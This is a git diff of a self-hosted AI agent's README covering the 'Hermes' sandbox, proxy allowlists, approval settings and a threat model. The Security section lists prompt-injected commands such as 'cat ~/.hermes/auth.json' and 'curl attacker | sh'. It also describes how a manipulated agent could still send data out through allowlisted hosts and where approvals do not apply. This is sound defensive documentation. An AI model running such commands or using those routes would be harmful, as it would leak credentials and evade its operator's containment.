@@ -108,9 +108,6 @@ the results come back through the model.
 - **Search results are untrusted input.** Keep personal data (private notes,
   mail, credentials) out of this agent's memory and context.
 
-To enable it on an existing deployment, add the `web:` block shown under
-Requirements to `data/config.yaml` and restart `hermes`.
-
 ## The sandbox
 
 `hermes-sandbox` is a Debian container built on the Pi from
@@ -154,9 +151,10 @@ container's output, so denied requests (`TCP_DENIED`) appear in Dozzle; that
 is the way to find a hostname a tool needs.
 
 - Only `CONNECT` to port 443 and only to listed hostnames. Plain HTTP is
-  denied, and so is any destination given as an IP address: Squid would match
-  `dstdomain` against the IP's reverse-DNS name, which the IP's owner
-  controls.
+  denied, and so is any destination given as an IPv4 address: Squid would
+  match `dstdomain` against the IP's reverse-DNS name, which the IP's owner
+  controls. The rule does not match IPv6 literals; the Docker networks here
+  have no IPv6, so they have nowhere to go.
 - Destinations that resolve to private, loopback, link-local or tailnet
   addresses (`10/8`, `172.16/12`, `192.168/16`, `100.64/10`, `127/8`,
   `169.254/16`) are denied even for allowlisted names, which blocks DNS
@@ -179,80 +177,30 @@ is the way to find a hostname a tool needs.
 `sudo ./setup.sh reconcile hermes-agent` also creates, once, the SSH keys in
 `apps/hermes-agent/ssh/` (a root-only directory): Hermes's client key, its
 public half, the sandbox's host key, and a `known_hosts` that pins that host
-key for Hermes. It seeds `data/config.yaml` on first run:
+key for Hermes.
 
-```yaml
-model:
-  provider: "openai-codex"
-terminal:
-  backend: "ssh"
-  ssh_host: "hermes-sandbox"
-  ssh_user: "agent"
-  ssh_port: 2222
-  ssh_key: "/run/hermes-ssh/id_ed25519"
-  sync_back_max_bytes: 0
-approvals:
-  mode: "manual"
-auth:
-  adopt_external_logins: false
-web:
-  search_backend: "openai-native"
-  keyless_fallback: false
-  keyless_rescue: false
-```
+## Configuration
 
-It never overwrites an existing `config.yaml`, so later changes from the
-dashboard's Config page persist; it refuses to run if that path is a
-symlink, and never changes the owner or mode of anything inside `data/`,
-which the `hermes` container can write. If you change `terminal.backend`
-there, you bypass the sandbox: commands would run inside the `hermes`
-container next to the ChatGPT login. Removing `sync_back_max_bytes: 0`
-re-enables copying files from the sandbox into Hermes's skills.
+[`apps/hermes-agent/config.yaml`](../apps/hermes-agent/config.yaml) is the
+single source of Hermes's settings. Every reconcile installs it over
+`data/config.yaml` (written to a temporary file and renamed, so a symlink in
+`data/` is replaced, never followed) and recreates the four containers so the
+running state always matches the repo. Data and workspace persist.
 
-**An existing deployment** (seeded before the `ssh_*` keys were added) needs
-them added once, since `config.yaml` is never overwritten. Then restart
-`hermes` so it picks up the `TERMINAL_ENV` default from `compose.yaml`:
-
-```sh
-H=/mnt/ssd/homelab/apps/hermes-agent
-HC="sudo docker compose --project-name hermes-agent --env-file $H/.env -f $H/compose.yaml"
-for kv in "terminal.ssh_host hermes-sandbox" "terminal.ssh_user agent" \
-          "terminal.ssh_port 2222" "terminal.ssh_key /run/hermes-ssh/id_ed25519"; do
-  $HC exec -u hermes hermes hermes config set --force $kv
-done
-sudo ./setup.sh reconcile hermes-agent
-```
-
-## Migrating from the llama.cpp deployment
-
-The old `config.yaml` points at llama.cpp, and `reconcile hermes-agent` refuses
-to continue while it does. On the Pi, after `git pull --ff-only`:
-
-```sh
-H=/mnt/ssd/homelab/apps/hermes-agent
-L=/mnt/ssd/homelab/apps/llama-cpp
-
-# 1. Move the old config aside (it holds the llama.cpp API key).
-sudo mv $H/data/config.yaml $H/data/config.yaml.llama
-
-# 2. Stop llama.cpp.
-docker compose --project-name llama-cpp --env-file $L/.env \
-  -f $L/compose.yaml down
-
-# 3. Deploy the new Hermes stack, then remove the unused network.
-sudo ./setup.sh reconcile hermes-agent
-docker network rm llama-cpp
-
-# 4. Sign in (see "Signing in with Codex"), then delete the old config.
-sudo rm $H/data/config.yaml.llama
-
-# 5. Optional and irreversible: delete the GGUF models and old runtime files.
-sudo rm -r $L
-```
-
-Then, in the Tailscale admin console, remove `svc:llama` from the ACL
-`grants` and delete the `llama` Service definition. Existing Hermes sessions
-and memory in `data/` are kept.
+- **Change a setting:** edit the file, commit, `git pull`, then
+  `sudo ./setup.sh reconcile hermes-agent`.
+- **Roll back:** `git revert` the commit and reconcile again. Sessions,
+  memory and the Codex login live in `data/` and are not touched.
+- **Dashboard Config page:** edits last only until the next reconcile. Copy
+  anything worth keeping into the repo file.
+- **Dashboard file panel:** it reads the `terminal.ssh_*` keys from this
+  file (not from the container environment) to browse and download files in
+  the sandbox.
+- **Do not** change `terminal.backend`: commands would run inside the
+  `hermes` container next to the ChatGPT login. Removing
+  `sync_back_max_bytes: 0` lets the sandbox write into Hermes's skills.
+  Removing `agent.disabled_toolsets: ["browser"]` re-enables a tool that
+  runs model-written Python in the `hermes` container (see Security).
 
 ## Security
 
@@ -290,23 +238,31 @@ that threat model, not just "add a password."
 tools and `execute_code` run in `hermes-sandbox` over SSH. A prompt-injected
 `env`, `cat ~/.hermes/auth.json`, or `curl attacker | sh` runs in a container
 that has no ChatGPT login, no dashboard secret, no SSH private key and no
-route to OpenAI. Hermes also never forwards its provider credentials over the
-SSH backend, even if listed, and refuses to sync `auth.json` and `.env`. It
-does copy its skills and cache into the sandbox (and any other credential
-file a skill declares, such as session history), and copying back is
-disabled so the sandbox cannot plant skills in Hermes. The sandbox holds the
-SSH *public* key and its own host key.
+route to OpenAI. Hermes refuses to sync `auth.json` and `.env`, but it does
+copy its skills and cache into the sandbox (and any other credential file a
+skill declares, such as session history), and it passes through environment
+variables a skill or the config declares. Copying back is disabled
+(`sync_back_max_bytes: 0`). The sandbox holds the SSH *public* key and its
+own host key.
+
+**Not everything runs in the sandbox.** Shell commands, file tools and
+`execute_code` do; MCP servers, plugins, hooks, skill loading and cron
+scripts run in the `hermes` container. So does the browser toolset's
+`browser_exec`, which runs model-written Python with no approval prompt and
+could read `auth.json` and the SSH key. The browser toolset is therefore
+disabled in `config.yaml`. Do not configure local (stdio) MCP servers or
+cron scripts without treating them as running next to the login.
 
 **Network egress is allowlisted.** Neither container has a route out except
 through its proxy; `hermes` can reach OpenAI only, the sandbox can reach
-registries and GitHub only. Web search goes through OpenAI; the bundled
-browser, `web_extract` and the dashboard's skill-hub installs and update
-checks have nowhere to go.
+registries and GitHub only. Web search goes through OpenAI; `web_extract` and
+the dashboard's skill-hub installs and update checks have nowhere to go.
 
-**Command approval is forced to `manual`.** The SSH backend keeps Hermes's
-dangerous-command checks on, and `approvals.mode: manual` makes a human
-confirm anything the pattern matcher flags. `approvals.mode: off` and
-`HERMES_YOLO_MODE` are never set.
+**Command approval is `manual`.** `approvals.mode: manual` makes a human
+confirm terminal commands that Hermes's dangerous-command patterns flag. It
+does not cover file writes, MCP calls, skill or memory writes, or creating
+cron jobs, and upstream describes it as catching mistakes, not adversarial
+output. `approvals.mode: off` and `HERMES_YOLO_MODE` are never set.
 
 **Container hardening.** All four containers drop all capabilities and set
 `no-new-privileges`, with memory and PID limits. The sandbox and both proxies
@@ -320,15 +276,20 @@ anything in `workspace/` and the files Hermes synced into it, burn CPU and
 memory up to its limits, fetch from the allowlisted registries/GitHub, and
 open connections to the `hermes` container over `link` (the dashboard login
 is the only thing guarding that port, and it locks a client out for a short
-while after 10 failed attempts). It cannot read the ChatGPT login, write
-into Hermes's own files, reach the internet outside the allowlist, reach the
-LAN or tailnet, or touch other containers or the host. It can still lie in
-the output it returns to the model.
+while after 10 failed attempts). It cannot read the ChatGPT login, reach the
+internet outside the allowlist, reach the LAN or tailnet, or touch other
+containers or the host. It cannot write into Hermes's files directly, but it
+can lie in the output it returns to the model, and the model's own skill and
+memory tools can then persist what it said.
 
 **Blast radius if `hermes` itself is manipulated** (for example through
 content it summarises): it can read its own data volume, including
-`auth.json`, and reach OpenAI. It cannot send that data anywhere else. A
-stolen ChatGPT refresh token would have to leave through `*.openai.com`.
+`auth.json`, and reach OpenAI. A stolen ChatGPT refresh token would have to
+leave through `*.openai.com`, but anything in the conversation can still be
+written to the sandbox by the model and sent out through an allowlisted host
+(for example GitHub) with an attacker-supplied token, and `*.openai.com` also
+admits `api.openai.com` with any API key. Keep personal data out of this
+agent.
 
 Prompt injection itself cannot be eliminated by configuration; the separation
 and the allowlists bound what a successful one can do.
